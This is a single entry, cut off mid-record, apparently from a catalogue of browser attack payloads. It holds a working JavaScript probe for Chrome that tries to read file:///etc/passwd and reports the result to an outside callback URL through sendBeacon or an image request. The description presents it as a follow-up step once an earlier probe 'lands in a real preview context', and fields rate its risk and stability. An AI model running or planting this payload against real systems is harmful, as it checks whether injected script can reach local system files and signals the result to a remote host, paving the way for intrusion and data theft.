    {
      "id": "chrome_file_local_probe",
      "category": "file_system",
      "browser": "chrome",
      "technique": "local_file_fetch_probe",
      "payload": "(function(){var base='{url}';var sep=base.indexOf('?')===-1?'?':'&';fetch('file:///etc/passwd').then(function(r){return r.text().then(function(t){navigator.sendBeacon(base+sep+'probe=chrome-file-fetch',JSON.stringify({status:r.status,length:t.length}));});}).catch(function(){(new Image()).src=base+sep+'probe=chrome-file-fetch-blocked';});})();",
      "description": "Local-resource reachability check with blind proof, useful after a boundary probe lands in a real preview context.",
      "risk_level": "medium",
      "research_tier": "validation",
      "stability": "medium",
      "expected_signal": "local_resource_probe",
